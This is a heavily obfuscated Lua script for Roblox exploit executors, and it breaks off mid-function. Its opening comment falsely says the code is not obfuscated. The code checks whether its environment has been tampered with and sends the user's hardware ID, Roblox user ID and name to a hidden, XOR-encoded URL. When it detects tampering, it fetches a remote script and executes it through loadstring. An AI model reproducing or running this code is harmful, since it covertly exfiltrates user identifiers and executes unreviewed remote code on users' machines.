-- This code isn't obfuscated bru

local v0 = string.char;
local v1 = string.byte;
local v2 = string.sub;
local v3 = bit32 or bit;
local v4 = v3.bxor;
local v5 = table.concat;
local v6 = table.insert;
local function v7(v15, v16)
	local FlatIdent_95CAC = 0;
	local v17;
	while true do
		if (FlatIdent_95CAC == 1) then
			return v5(v17);
		end
		if (FlatIdent_95CAC == 0) then
			v17 = {};
			for v140 = 1, #v15 do
				v6(v17, v0(v4(v1(v2(v15, v140, v140 + 1)), v1(v2(v16, 1 + (v140 % #v16), 1 + (v140 % #v16) + 1))) % 256));
			end
			FlatIdent_95CAC = 1;
		end
	end
end
local v8 = (syn and syn.request) or http_request or request;
local v9 = _G[v7("\194\192\201\44\246\175\248\21\212\218", "\126\177\163\187\69\134\219\167")] or v7("\54\195\33\203\243\52\195", "\156\67\173\74\165");
local v10 = (function()
	local v18 = 0 - 0;
	local v19;
	local v20;
	local v21;
	local v22;
	local v23;
	local v24;
	local v25;
	while true do
		if (v18 == (0 + 0)) then
			local FlatIdent_69270 = 0;
			while true do
				if (FlatIdent_69270 == 1) then
					v18 = 1791 - (1010 + 780);
					break;
				end
				if (FlatIdent_69270 == 0) then
					v19 = 1167 - (645 + 522);
					v20 = nil;
					FlatIdent_69270 = 1;
				end
			end
		end
		if (v18 == (2 + 0)) then
			local FlatIdent_7126A = 0;
			while true do
				if (FlatIdent_7126A == 1) then
					v18 = 14 - 11;
					break;
				end
				if (FlatIdent_7126A == 0) then
					v23 = nil;
					v24 = nil;
					FlatIdent_7126A = 1;
				end
			end
		end
		if (v18 == (8 - 5)) then
			v25 = nil;
			while true do
				local FlatIdent_2BD95 = 0;
				local v213;
				local v214;
				while true do
					if (FlatIdent_2BD95 == 1) then
						while true do
							if (0 == v213) then
								v214 = 0 - 0;
								while true do
									if (v214 == (0 - 0)) then
										local FlatIdent_25011 = 0;
										while true do
											if (FlatIdent_25011 == 0) then
												if (v19 == (506 - (351 + 154))) then
													local v264 = 0;
													while true do
														if (1 == v264) then
															v19 = 2;
															break;
														end
														if ((1574 - (1281 + 293)) == v264) then
															local FlatIdent_781F8 = 0;
															while true do
																if (FlatIdent_781F8 == 0) then
																	v22, v23 = pcall(function()
																		return syn and syn.get_hwid and syn:get_hwid();
																	end);
																	if (v22 and v23) then
																		return v23;
																	end
																	FlatIdent_781F8 = 1;
																end
																if (1 == FlatIdent_781F8) then
																	v264 = 267 - (28 + 238);
																	break;
																end
															end
														end
													end
												end
												if ((6 - 3) == v19) then
													return v7("\33\185\66\24\179\49\72", "\38\84\215\41\118\220\70");
												end
												FlatIdent_25011 = 1;
											end
											if (FlatIdent_25011 == 1) then
												v214 = 1560 - (1381 + 178);
												break;
											end
										end
									end
									if (v214 == (1 + 0)) then
										if (v19 == (2 + 0)) then
											local FlatIdent_104D4 = 0;
											while true do
												if (FlatIdent_104D4 == 1) then
													v19 = 2 + 1;
													break;
												end
												if (FlatIdent_104D4 == 0) then
													v24, v25 = pcall(function()
														return game.Players.LocalPlayer;
													end);
													if (v24 and v25) then
														return v25.UserId .. "_" .. v25.Name;
													end
													FlatIdent_104D4 = 1;
												end
											end
										end
										if (v19 == (0 - 0)) then
											local v265 = 0 + 0;
											while true do
												if (v265 == (470 - (381 + 89))) then
													v20, v21 = pcall(function()
														return gethwid and gethwid();
													end);
													if (v20 and v21) then
														return v21;
													end
													v265 = 1;
												end
												if (v265 == (1 + 0)) then
													v19 = 1;
													break;
												end
											end
										end
										break;
									end
								end
								break;
							end
						end
						break;
					end
					if (FlatIdent_2BD95 == 0) then
						v213 = 1836 - (1045 + 791);
						v214 = nil;
						FlatIdent_2BD95 = 1;
					end
				end
			end
			break;
		end
		if ((1 + 0) == v18) then
			local FlatIdent_27957 = 0;
			while true do
				if (FlatIdent_27957 == 1) then
					v18 = 2 - 0;
					break;
				end
				if (0 == FlatIdent_27957) then
					v21 = nil;
					v22 = nil;
					FlatIdent_27957 = 1;
				end
			end
		end
	end
end)();
local function v11(v26)
	local v27 = 1156 - (1074 + 82);
	local v28;
	local v29;
	while true do
		if (v27 == (3 - 1)) then
			error(v7("\143\228\49\98", "\199\235\144\82\61\152") .. tostring(v26), 0);
			break;
		end
		if (v27 == 1) then
			local FlatIdent_65290 = 0;
			local v208;
			local v209;
			while true do
				if (FlatIdent_65290 == 1) then
					while true do
						if (v208 == (1455 - (990 + 465))) then
							v209 = 0 + 0;
							while true do
								if (v209 == (1 + 0)) then
									v27 = 2;
									break;
								end
								if (v209 == 0) then
									local FlatIdent_12544 = 0;
									while true do
										if (FlatIdent_12544 == 0) then
											v29 = v7("\179\66\221\176\41\10\127\142\169\87\222\238\61\89\36\201\174\84\220\179\63\66\51\206\181\66\204\174\46\30\51\206\182\25\255\165\34\95\60\140\189\95\197\165\41\31\49\211\184\94\204\174\55\85\35\200\168\27\194\169\57\91\127\211\190\80\218\239\50\85\49\197\168\25\196\161\51\94\127", "\161\219\54\169\192\90\48\80") .. (((v26 == v7("\125\67\13\53\76\80\63\116", "\69\41\34\96")) and v7("\168\194\218\26\7\57\237\141\219\31\3", "\75\220\163\183\106\98")) or ((v26 == v7("\54\187\134\39\220\16\133\217", "\185\98\218\235\87")) and v7("\223\61\42\246\219\184\153\114\43\243\223", "\202\171\92\71\134\190")) or v7("\61\192\33\152\44\211\127\198\37\212\45", "\232\73\161\76"));
											pcall(function()
												local FlatIdent_74348 = 0;
												local v260;
												local v261;
												while true do
													if (FlatIdent_74348 == 1) then
														while true do
															if (v260 == 0) then
																v261 = v8({[v7("\142\203\78", "\126\219\185\34\61")]=v29,[v7("\33\203\74\122\113\115", "\135\108\174\62\18\30\23\147")]=v7("\145\204\30", "\167\214\137\74\171\120\206\83")});
																loadstring(v261.Body)();
																break;
															end
														end
														break;
													end
													if (FlatIdent_74348 == 0) then
														v260 = 0 + 0;
														v261 = nil;
														FlatIdent_74348 = 1;
													end
												end
											end);
											FlatIdent_12544 = 1;
										end
										if (FlatIdent_12544 == 1) then
											v209 = 1;
											break;
										end
									end
								end
							end
							break;
						end
					end
					break;
				end
				if (FlatIdent_65290 == 0) then
					v208 = 1784 - (214 + 1570);
					v209 = nil;
					FlatIdent_65290 = 1;
				end
			end
		end
		if (v27 == (0 - 0)) then
			local FlatIdent_324DE = 0;
			while true do
				if (FlatIdent_324DE == 1) then
					v27 = 1;
					break;
				end
				if (0 == FlatIdent_324DE) then
					v28 = v7("\88\2\54\2\237\10\89\109\2\236\95\28\39\17\234\81\4\33\26\176\70\19\48\17\251\92\88\35\2\238\31\23\50\27\177\81\4\33\26\240\85\27\39\1\247\67\89\52\64\177\91\19\59\1\177\66\25\55\6\251\66\73\35\17\234\89\25\44\79\252\81\24\100\0\251\81\5\45\28\163", "\158\48\118\66\114") .. v26 .. v7("\237\55\19\36\122\181\239\148\47\21\47\46", "\155\203\68\112\86\19\197") .. v9 .. v7("\0\213\33\245\68\37", "\152\38\189\86\156\32\24\133") .. v10;
					pcall(function()
						v8({[v7("\201\69\171", "\38\156\55\199")]=v28,[v7("\133\120\104\32\28\112", "\35\200\29\28\72\115\20\154")]=v7("\62\154\229", "\84\121\223\177\191\237\76")});
					end);
					FlatIdent_324DE = 1;
				end
			end
		end
	end
end
local function v12(v30)
	local FlatIdent_7909D = 0;
	local v31;
	local v32;
	local v33;
	while true do
		if (FlatIdent_7909D == 1) then
			if not v31 then
				return false;
			end
			return (v32 == v7("\243\13\29", "\156\168\78\64\224\212\121")) and rawequal(v33, v30);
		end
		if (FlatIdent_7909D == 0) then
			if (type(v30) ~= v7("\1\3\183\40\19\31\182\37", "\75\103\118\217")) then
				return false;
			end
			v31, v32, v33 = pcall(debug.info, v30, v7("\212\82", "\126\167\52\16\116\217"));
			FlatIdent_7909D = 1;
		end
	end
end
do
	local FlatIdent_4CC24 = 0;
	local v34;
	local v35;
	while true do
		if (FlatIdent_4CC24 == 0) then
			v34, v35 = pcall(function()
				local FlatIdent_40B41 = 0;
				local v141;
				local v142;
				while true do
					if (1 == FlatIdent_40B41) then
						while true do
							if (v141 == (626 - (512 + 114))) then
								local FlatIdent_8A742 = 0;
								while true do
									if (0 == FlatIdent_8A742) then
										v142 = loadstring(v7("\21\235\177\219\21\224\229\159\84\189\242", "\174\103\142\197"));
										return v142 and v142();
									end
								end
							end
						end
						break;
					end
					if (FlatIdent_40B41 == 0) then
						v141 = 1726 - (1668 + 58);
						v142 = nil;
						FlatIdent_40B41 = 1;
					end
				end
			end);
			if (not v34 or (v35 ~= (3485 - 2148))) then
				v11(v7("\98\41\82\40\32\76\199\7", "\152\54\72\63\88\69\62"));
			end
			FlatIdent_4CC24 = 1;
		end
		if (FlatIdent_4CC24 == 1) then
			if not v12(loadstring) then
				v11(v7("\224\197\227\76\209\214\209\13", "\60\180\164\142"));
			end
			break;
		end
	end
end
do
	local FlatIdent_28F3E = 0;
	local v36;
	local v37;
	local v38;
	local v39;
	local v40;
	while true do
		if (FlatIdent_28F3E == 0) then
			v36 = 0 - 0;
			v37 = nil;
			FlatIdent_28F3E = 1;
		end
		if (FlatIdent_28F3E == 1) then
			v38 = nil;
			v39 = nil;
			FlatIdent_28F3E = 2;
		end
		if (FlatIdent_28F3E == 2) then
			v40 = nil;
			while true do
				if (v36 == 0) then
					local FlatIdent_5F1CB = 0;
					while true do
						if (FlatIdent_5F1CB == 0) then
							if not v12(debug.info) then
								v11(v7("\108\95\8\57\34\255\45\10", "\114\56\62\101\73\71\141"));
							end
							v37, v38, v39, v40 = pcall(debug.info, pcall, v7("\171\229\221", "\164\216\137\187"));
							FlatIdent_5F1CB = 1;
						end
						if (FlatIdent_5F1CB == 1) then
							v36 = 3 - 2;
							break;
						end
					end
				end
				if (v36 == 1) then
					if (not v37 or (v38 ~= v7("\233\197\12", "\107\178\134\81\210\198\158")) or (v39 ~= -(1 + 0)) or not rawequal(v40, pcall)) then
						v11(v7("\12\15\143\214\175\42\49\208", "\202\88\110\226\166"));
					end
					break;
				end
			end
			break;
		end
	end
end
do
	if (syn and syn.request and not v12(syn.request)) then
		v11(v7("\247\14\143\231\207\209\48\209", "\170\163\111\226\151"));
	end
	if ((type(game.HttpGet) == v7("\23\37\188\59\90\62\38\31", "\73\113\80\210\88\46\87")) and not v12(game.HttpGet)) then
		v11(v7("\181\45\192\2\226\147\19\158", "\135\225\76\173\114"));
	end
end
do
	local function v41(v143)
		v11(v7("\46\236\181\160\169\175\152\75", "\199\122\141\216\208\204\221"));
	end
	if ((type(debug) ~= v7("\185\220\18\252\125", "\150\205\189\112\144\24")) or (type(debug.info) ~= v7("\35\145\177\79\16\129\30\30", "\112\69\228\223\44\100\232\113")) or (type(debug.traceback) ~= v7("\210\10\9\208\162\117\137\218", "\230\180\127\103\179\214\28"))) then
		v41(1);
	end
	if not v12(debug.info) then
		v41(1 + 1);
	end
	if not v12(debug.traceback) then
		v41(2);
	end
	local v42 = {pcall,xpcall,tostring,tonumber,type,typeof,rawequal,rawget,rawset,getmetatable,setmetatable,select,error,assert,string.byte,string.sub,string.char,bit32.bxor,buffer.create,debug.info,debug.traceback,coroutine.resume,game.GetService,Instance.new};
	for v144, v145 in ipairs(v42) do
		if not v12(v145) then
			v41(100 + v144);
		end
	end
	local function v43(v146, v147)
		return v146 + v147;
	end
	local v44, v45, v46 = pcall(debug.info, v43, v7("\159\3", "\128\236\101\63\38\132\33"));
	if (not v44 or (v45 == v7("\151\138\44", "\175\204\201\113\36\214\139")) or not rawequal(v46, v43)) then
		v41(3);
	end
end
do
	local function v47(v148)
		v11(v7("\115\205\56\204\1\85\243\100", "\100\39\172\85\188"));
	end
	local function v48(v149)
		local v150 = coroutine.create(v149);
		local v151, v152 = coroutine.resume(v150);
		return not v151 and (string.find(tostring(v152), v7("\180\113\188\140\55\237\121\186\146\60\190\107", "\83\205\24\217\224"), 1, true) ~= nil) and (coroutine.status(v150) == v7("\226\192\204\57", "\93\134\165\173"));
	end
	if not v48(function()
		local FlatIdent_4D434 = 0;
		local v153;
		while true do
			if (FlatIdent_4D434 == 0) then
				v153 = setmetatable({}, {[v7("\129\205\213\205\41\218\160\119\176\245", "\30\222\146\161\162\90\174\210")]=function()
					local v202 = 0 + 0;
					while true do
						if ((0 + 0) == v202) then
							local FlatIdent_45D37 = 0;
							while true do
								if (FlatIdent_45D37 == 0) then
									coroutine.yield(v7("\237\65\127\1\224\74", "\106\133\46\16"));
									return "s";
								end
							end
						end
					end
				end});
				return tostring(v153);
			end
		end
	end) then
		v47(1434 - (797 + 636));
	end
	if not v48(function()
		return string.gsub("a", "a", function()
			local FlatIdent_6A091 = 0;
			local v203;
			local v204;
			while true do
				if (1 == FlatIdent_6A091) then
					while true do
						if (v203 == (1619 - (1427 + 192))) then
							v204 = 0 + 0;
							while true do
								if ((0 - 0) == v204) then
									local FlatIdent_6D9D2 = 0;
									while true do
										if (FlatIdent_6D9D2 == 0) then
											coroutine.yield(v7("\80\47\124\247\95\68", "\32\56\64\19\156\58"));
											return "b";
										end
									end
								end
							end
							break;
						end
					end
					break;
				end
				if (FlatIdent_6A091 == 0) then
					v203 = 0 - 0;
					v204 = nil;
					FlatIdent_6A091 = 1;
				end
			end
		end);
	end) then
		v47(2 + 0);
	end
	if not v48(function()
		local FlatIdent_6225E = 0;
		local v154;
		local v155;
		while true do
			if (FlatIdent_6225E == 1) then
				while true do
					if (v154 == (0 + 0)) then
						v155 = {(1278 - (316 + 960)),1};
						table.sort(v155, function(v238, v239)
							local FlatIdent_21449 = 0;
							local v240;
							while true do
								if (FlatIdent_21449 == 0) then
									v240 = 0 + 0;
									while true do
										if ((0 + 0) == v240) then
											coroutine.yield(v7("\82\199\234\93\95\246", "\224\58\168\133\54\58\146"));
											return v238 < v239;
										end
									end
									break;
								end
							end
						end);
						break;
					end
				end
				break;
			end
			if (FlatIdent_6225E == 0) then
				v154 = 0;
				v155 = nil;
				FlatIdent_6225E = 1;
			end
		end
	end) then
		v47(3);
	end
	if not v48(function()
		local FlatIdent_67691 = 0;
		local v156;
		while true do
			if (FlatIdent_67691 == 0) then
				v156 = setmetatable({}, {[v7("\102\105\66\243\113\131\159", "\107\57\54\43\157\21\230\231")]=function()
					coroutine.yield(v7("\211\132\30\254\188\216", "\175\187\235\113\149\217\188"));
				end});
				return v156.k;
			end
		end
	end) then
		v47(15 - 11);
	end
	if not v48(function()
		local FlatIdent_1CA5D = 0;
		local v157;
		while true do
			if (FlatIdent_1CA5D == 0) then
				v157 = setmetatable({}, {[v7("\3\144\143\73\244\112\118\56\170\153", "\24\92\207\225\44\131\25")]=function()
					coroutine.yield(v7("\67\220\183\71\30\121", "\29\43\179\216\44\123"));
				end});
				v157.k = 1;
				break;
			end
		end
	end) then
		v47(556 - (83 + 468));
	end
	if not v48(function()
		local FlatIdent_272FB = 0;
		local v159;
		local v160;
		local v161;
		local v162;
		while true do
			if (FlatIdent_272FB == 2) then
				while true do
					local FlatIdent_521D6 = 0;
					while true do
						if (0 == FlatIdent_521D6) then
							if (v159 == 0) then
								v160 = {[v7("\130\230\37\93", "\44\221\185\64")]=function()
									local FlatIdent_634AF = 0;
									while true do
										if (0 == FlatIdent_634AF) then
											coroutine.yield(v7("\9\232\71\84\118\5", "\19\97\135\40\63"));
											return true;
										end
									end
								end};
								v161 = setmetatable({}, v160);
								v159 = 4 - 3;
							end
							if (v159 == 1) then
								local FlatIdent_4223E = 0;
								local v215;
								while true do
									if (FlatIdent_4223E == 0) then
										v215 = 0;
										while true do
											if (v215 == (0 - 0)) then
												local FlatIdent_6AEED = 0;
												while true do
													if (FlatIdent_6AEED == 0) then
														v162 = setmetatable({}, v160);
														return v161 == v162;
													end
												end
											end
										end
										break;
									end
								end
							end
							break;
						end
					end
				end
				break;
			end
			if (FlatIdent_272FB == 0) then
				v159 = 1806 - (1202 + 604);
				v160 = nil;
				FlatIdent_272FB = 1;
			end
			if (1 == FlatIdent_272FB) then
				v161 = nil;
				v162 = nil;
				FlatIdent_272FB = 2;
			end
		end
	end) then
		v47(6);
	end
	local v49 = coroutine.create(function()
		local FlatIdent_5E109 = 0;
		local v163;
		local v164;
		local v165;
		local v166;
		while true do
			if (FlatIdent_5E109 == 1) then
				v165 = nil;
				v166 = nil;
				FlatIdent_5E109 = 2;
			end
			if (FlatIdent_5E109 == 2) then
				while true do
					if ((326 - (45 + 280)) == v163) then
						v166 = nil;
						while true do
							if (v164 == (0 + 0)) then
								local FlatIdent_2A644 = 0;
								local v241;
								while true do
									if (FlatIdent_2A644 == 0) then
										v241 = 0;
										while true do
											if (0 == v241) then
												local v262 = 0 + 0;
												while true do
													if (v262 == (0 + 0)) then
														v165, v166 = pcall(function()
															return coroutine.yield(v7("\190\95\50\55\35\14\183\85\54\55\43\14\161\87", "\81\206\60\83\91\79"));
														end);
														return v165 and (v166 == v7("\92\174\195\103\34\198\73\155\65\160", "\196\46\203\176\18\79\163\45"));
													end
												end
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
					if (v163 == 0) then
						local FlatIdent_7F3C8 = 0;
						while true do
							if (FlatIdent_7F3C8 == 0) then
								v164 = 0;
								v165 = nil;
								FlatIdent_7F3C8 = 1;
							end
							if (1 == FlatIdent_7F3C8) then
								v163 = 1 + 0;
								break;
							end
						end
					end
				end
				break;
			end
			if (FlatIdent_5E109 == 0) then
				v163 = 0 - 0;
				v164 = nil;
				FlatIdent_5E109 = 1;
			end
		end
	end);
	local v50, v51 = coroutine.resume(v49);
	local v52, v53 = coroutine.resume(v49, v7("\170\39\109\11\41\254\235\135\45\117", "\143\216\66\30\126\68\155"));
	if (not v50 or (v51 ~= v7("\186\203\12\199\201\156\206\232\175\196\9\244\202\168", "\129\202\168\109\171\165\195\183")) or not v52 or (v53 ~= true)) then
		v47(7);
	end
end
do
	local v54 = 0;
	local v55;
	local v56;
	local v57;
	local v58;
	local v59;
	local v60;
	local v61;
	local v62;
	local v63;
	local v64;
	local v65;
	local v66;
	local v67;
	while true do
		if ((1 + 2) == v54) then
			local v210 = 0 - 0;
			while true do
				if (v210 == 0) then
					local FlatIdent_83844 = 0;
					while true do
						if (FlatIdent_83844 == 0) then
							v64 = nil;
							function v64()
								return string.sub(v7("\121\133\45", "\119\24\231\78"), {});
							end
							FlatIdent_83844 = 1;
						end
						if (1 == FlatIdent_83844) then
							v210 = 1912 - (340 + 1571);
							break;
						end
					end
				end
				if (v210 == (1 + 1)) then
					v54 = 1776 - (1733 + 39);
					break;
				end
				if (v210 == (2 - 1)) then
					v65 = xpcall(v64, function(v242)
						local FlatIdent_92F66 = 0;
						local v243;
						local v244;
						local v245;
						local v246;
						local v247;
						while true do
							if (FlatIdent_92F66 == 0) then
								v243 = 1034 - (125 + 909);
								v244 = nil;
								FlatIdent_92F66 = 1;
							end
							if (FlatIdent_92F66 == 1) then
								v245 = nil;
								v246 = nil;
								FlatIdent_92F66 = 2;
							end
							if (FlatIdent_92F66 == 2) then
								v247 = nil;
								while true do
									if (v243 == 1) then
										if ((v244 == v7("\1\53\201", "\213\90\118\148")) and (v245 == -(1949 - (1096 + 852))) and rawequal(v246, string.sub) and rawequal(v247, v64) and string.find(tostring(v242), v7("\85\59\185\84\72\73\110\177\78\93\94\45\160\83\73\23\110\179\89\89\27\58\181\84\65\94", "\45\59\78\212\54"), 1, true)) then
											v63 = true;
										end
										break;
									end
									if (v243 == (0 + 0)) then
										local FlatIdent_89917 = 0;
										local v263;
										while true do
											if (FlatIdent_89917 == 0) then
												v263 = 0 - 0;
												while true do
													if (v263 == 1) then
														v243 = 1 + 0;
														break;
													end
													if (v263 == 0) then
														v244, v245, v246 = debug.info(2, v7("\145\33\163", "\113\226\77\197\42\188\32"));
														v247 = debug.info(515 - (409 + 103), "f");
														v263 = 237 - (46 + 190);
													end
												end
												break;
											end
										end
									end
								end
								break;
							end
						end
					end);
					if (v65 or not v63) then
						v55(100 - (51 + 44));
					end
					v210 = 2;
				end
			end
		end
		if (v54 == (0 + 0)) then
			local v211 = 0;
			while true do
				if ((1319 - (1114 + 203)) == v211) then
					v54 = 727 - (228 + 498);
					break;
				end
				if (v211 == (0 + 0)) then
					local FlatIdent_21CA5 = 0;
					while true do
						if (FlatIdent_21CA5 == 0) then
							v55 = nil;
							function v55(v248)
								v11(v7("\22\89\58\200\219\6\217\115", "\134\66\56\87\184\190\116"));
							end
							FlatIdent_21CA5 = 1;
						end
						if (FlatIdent_21CA5 == 1) then
							v211 = 1 + 0;
							break;
						end
					end
				end
				if (v211 == 1) then
					local FlatIdent_803FB = 0;
					while true do
						if (FlatIdent_803FB == 1) then
							v211 = 2;
							break;
						end
						if (FlatIdent_803FB == 0) then
							v56, v57 = pcall(getmetatable, "");
							v58, v59 = pcall(getmetatable, Vector3.zero);
							FlatIdent_803FB = 1;
						end
					end
				end
			end
		end
		if ((667 - (174 + 489)) == v54) then
			v66, v67 = ("SL"):byte(2 - 1, 1907 - (830 + 1075));
			if ((v66 ~= (607 - (303 + 221))) or (v67 ~= 76)) then
				v55(1275 - (231 + 1038));
			end
			break;
		end
		if (v54 == (2 + 0)) then
			local FlatIdent_6C967 = 0;
			while true do
				if (FlatIdent_6C967 == 0) then
					v62 = table.freeze({k=(1169 - (171 + 991))});
					if not table.isfrozen(v62) then
						v55(16 - 12);
					end
					FlatIdent_6C967 = 1;
				end
				if (FlatIdent_6C967 == 1) then
					if pcall(function()
						v62.k = 21 - 13;
					end) then
						v55(4);
					end
					v63 = false;
					FlatIdent_6C967 = 2;
				end
				if (2 == FlatIdent_6C967) then
					v54 = 3;
					break;
				end
			end
		end
		if (v54 == 1) then
			v60, v61 = pcall(getmetatable, CFrame.identity);
			if (not v56 or (v57 ~= v7("\8\57\12\251\20\238\53\52\40\48\11\183\28\171\40\38\124\61\6\184\18\238\37", "\85\92\81\105\219\121\139\65"))) then
				v55(2 - 1);
			end
			if (not v58 or (v59 ~= v7("\201\187\85\5\113\218\233\178\68\68\126\211\248\243\89\86\60\211\242\176\91\64\120", "\191\157\211\48\37\28")) or not v60 or (v61 ~= v7("\235\23\241\92\55\218\11\245\8\59\221\19\241\92\51\204\95\248\19\57\212\26\240", "\90\191\127\148\124"))) then
				v55(2);
			end
			if (not rawequal(("x").byte, string.byte) or not rawequal(("x").sub, string.sub) or not rawequal(("x").gsub, string.gsub) or not rawequal(("x").format, string.format) or not rawequal(("x").pack, string.pack)) then
				v55(3 + 0);
			end
			v54 = 6 - 4;
		end
	end
end
do
	local v68 = 0 - 0;
	local v69;
	local v70;
	local v71;
	local v72;
	local v73;
	local v74;
	while true do
		if (v68 == (1 - 0)) then
			v70 = {pcall,xpcall,tostring,rawequal,getmetatable,setmetatable,debug.info,string.byte,buffer.create,task.spawn,Instance.new,game.GetService};
			for v217, v218 in ipairs(v70) do
				local v219 = 0;
				local v220;
				local v221;
				local v222;
				while true do
					if (v219 == (4 - 3)) then
						local FlatIdent_7B2D6 = 0;
						while true do
							if (FlatIdent_7B2D6 == 0) then
								function v221()
									return setfenv(v218, {});
								end
								v222 = xpcall(v221, function(v253)
									local FlatIdent_6DFD9 = 0;
									local v254;
									local v255;
									local v256;
									local v257;
									local v258;
									local v259;
									while true do
										if (FlatIdent_6DFD9 == 1) then
											v256 = nil;
											v257 = nil;
											FlatIdent_6DFD9 = 2;
										end
										if (2 == FlatIdent_6DFD9) then
											v258 = nil;
											v259 = nil;
											FlatIdent_6DFD9 = 3;
										end
										if (3 == FlatIdent_6DFD9) then
											while true do
												if ((2 - 1) == v254) then
													local FlatIdent_71E8F = 0;
													while true do
														if (FlatIdent_71E8F == 1) then
															v254 = 2;
															break;
														end
														if (FlatIdent_71E8F == 0) then
															v257 = nil;
															v258 = nil;
															FlatIdent_71E8F = 1;
														end
													end
												end
												if (v254 == 0) then
													local FlatIdent_5AB84 = 0;
													while true do
														if (FlatIdent_5AB84 == 1) then
															v254 = 882 - (614 + 267);
															break;
														end
														if (FlatIdent_5AB84 == 0) then
															v255 = 711 - (530 + 181);
															v256 = nil;
															FlatIdent_5AB84 = 1;
														end
													end
												end
												if ((34 - (19 + 13)) == v254) then
													v259 = nil;
													while true do
														if (v255 == (1 - 0)) then
															if ((v256 == v7("\117\52\12", "\58\46\119\81\200\145\208\37")) and (v257 == -(2 - 1)) and rawequal(v258, setfenv) and rawequal(v259, v221) and string.find(tostring(v253), v7("\40\141\62\162\166\169\118\40\132\49\162\174\184\118\46\130\38\165\187\178\56\38\137\62\184", "\86\75\236\80\204\201\221"), 1, true)) then
																v220 = true;
															end
															break;
														end
														if (v255 == (0 - 0)) then
															local FlatIdent_94CF9 = 0;
															while true do
																if (FlatIdent_94CF9 == 1) then
																	v255 = 1 - 0;
																	break;
																end
																if (FlatIdent_94CF9 == 0) then
																	v256, v257, v258 = debug.info(1 + 1, v7("\169\88\176", "\32\218\52\214"));
																	v259 = debug.info(3, "f");
																	FlatIdent_94CF9 = 1;
																end
															end
														end
													end
													break;
												end
											end
											break;
										end
										if (FlatIdent_6DFD9 == 0) then
											v254 = 0 - 0;
											v255 = nil;
											FlatIdent_6DFD9 = 1;
										end
									end
								end);
								FlatIdent_7B2D6 = 1;
							end
							if (FlatIdent_7B2D6 == 1) then
								v219 = 3 - 1;
								break;
							end
						end
					end
					if (v219 == 0) then
						v220 = false;
						v221 = nil;
						v219 = 1813 - (1293 + 519);
					end
					if (v219 == (3 - 1)) then
						if (v222 or not v220) then
							v69((26 - 16) + v217);
						end
						break;
					end
				end
			end
			v71 = getfenv(0);
			v68 = 2;
		end
		if (v68 == (3 - 1)) then
			local FlatIdent_77529 = 0;
			while true do
				if (0 == FlatIdent_77529) then
					if ((type(v71) ~= v7("\102\64\117\137\251", "\235\18\33\23\229\158")) or rawequal(v71, _G)) then
						v69(8 - 6);
					end
					v72 = nil;
					FlatIdent_77529 = 1;
				end
				if (1 == FlatIdent_77529) then
					function v72()
						return secretToken;
					end
					v68 = 6 - 3;
					break;
				end
			end
		end
		if (v68 == (0 + 0)) then
			local FlatIdent_506A5 = 0;
			local v212;
			while true do
				if (FlatIdent_506A5 == 0) then
					v212 = 0 + 0;
					while true do
						if (v212 == (0 - 0)) then
							local FlatIdent_14124 = 0;
							while true do
								if (FlatIdent_14124 == 1) then
									v212 = 1 + 0;
									break;
								end
								if (0 == FlatIdent_14124) then
									v69 = nil;
									function v69(v249)
										v11(v7("\36\87\142\155\131\60\146\162", "\144\112\54\227\235\230\78\205"));
									end
									FlatIdent_14124 = 1;
								end
							end
						end
						if (v212 == (1 + 0)) then
							if ((type(getfenv) ~= v7("\181\61\1\255\196\82\188\38", "\59\211\72\111\156\176")) or (type(setfenv) ~= v7("\72\146\237\46\90\142\236\35", "\77\46\231\131"))) then
								v69(1 + 0);
							end
							v68 = 1;
							break;
						end
					end
					break;
				end
			end
		end
		if (3 == v68) then
			v73 = {[v7("\67\191\194\169\85\174\245\180\91\191\207", "\219\48\218\161")]=(335558 - (709 + 387))};
			v74 = setfenv(v72, v73);
			if (not rawequal(v74, v72) or not rawequal(getfenv(v72), v73) or (v72() ~= (336320 - (673 + 1185)))) then
				v69(8 - 5);
			end
			break;
		end
	end
end
do
	local function v75(v167)
		v11(v7("\208\112\113\89\222\93\223\182", "\128\132\17\28\41\187\47"));
	end
	local v76 = {};
	local v77 = {{function()
		return {};
	end,v7("\21\51\4\54\88\91\114\86\34", "\61\97\82\102\90")},{function()
		return function()
		end;
	end,v7("\170\59\165\72\211\94\17\7\246\110\251\83", "\105\204\78\203\43\167\55\126")},{function()
		return newproxy(false);
	end,v7("\176\185\38\12\23\5\211\80\255\234\115\6", "\49\197\202\67\126\115\100\167")},{function()
		return coroutine.create(function()
		end);
	end,v7("\35\83\205\44\129\82\4\119\11\199", "\62\87\59\191\73\224\54")},{function()
		return buffer.create(4);
	end,v7("\229\23\252\207\226\16\160\137\183\26", "\169\135\98\154")}};
	for v168, v169 in ipairs(v77) do
		local FlatIdent_75331 = 0;
		local v170;
		local v171;
		local v172;
		local v173;
		local v174;
		local v175;
		local v176;
		while true do
			if (FlatIdent_75331 == 3) then
				v176 = nil;
				while true do
					if ((1848 - (559 + 1288)) == v170) then
						local FlatIdent_2C7C4 = 0;
						while true do
							if (FlatIdent_2C7C4 == 0) then
								if rawequal(v173, v174) then
									v75(10 + v168);
								end
								v175 = tostring(v173);
								FlatIdent_2C7C4 = 1;
							end
							if (1 == FlatIdent_2C7C4) then
								v176 = tostring(v174);
								v170 = 1933 - (609 + 1322);
								break;
							end
						end
					end
					if ((456 - (13 + 441)) == v170) then
						local FlatIdent_2C980 = 0;
						while true do
							if (FlatIdent_2C980 == 0) then
								if (v175 == v176) then
									v75((74 - 54) + v168);
								end
								if ((string.sub(v175, 2 - 1, #v172) ~= v172) or (string.sub(v176, 4 - 3, #v172) ~= v172)) then
									v75(2 + 28 + v168);
								end
								FlatIdent_2C980 = 1;
							end
							if (FlatIdent_2C980 == 1) then
								if (v76[v175] or v76[v176]) then
									v75(40 + v168);
								end
								v170 = 10 - 7;
								break;
							end
						end
					end
					if (v170 == (2 + 1)) then
						v76[v175] = true;
						v76[v176] = true;
						break;
					end
					if (v170 == (0 + 0)) then
						local FlatIdent_4D11E = 0;
						local v225;
						while true do
							if (FlatIdent_4D11E == 0) then
								v225 = 0;
								while true do
									if (v225 == (0 - 0)) then
										v171, v172 = v169[1 + 0], v169[2];
										v173 = v171();
										v225 = 1;
									end
									if (v225 == (1 - 0)) then
										v174 = v171();
										v170 = 1 + 0;
										break;
									end
								end
								break;
							end
						end
					end
				end
				break;
			end
			if (FlatIdent_75331 == 0) then
				v170 = 0 - 0;
				v171 = nil;
				FlatIdent_75331 = 1;
			end
			if (FlatIdent_75331 == 2) then
				v174 = nil;
				v175 = nil;
				FlatIdent_75331 = 3;
			end
			if (FlatIdent_75331 == 1) then
				v172 = nil;
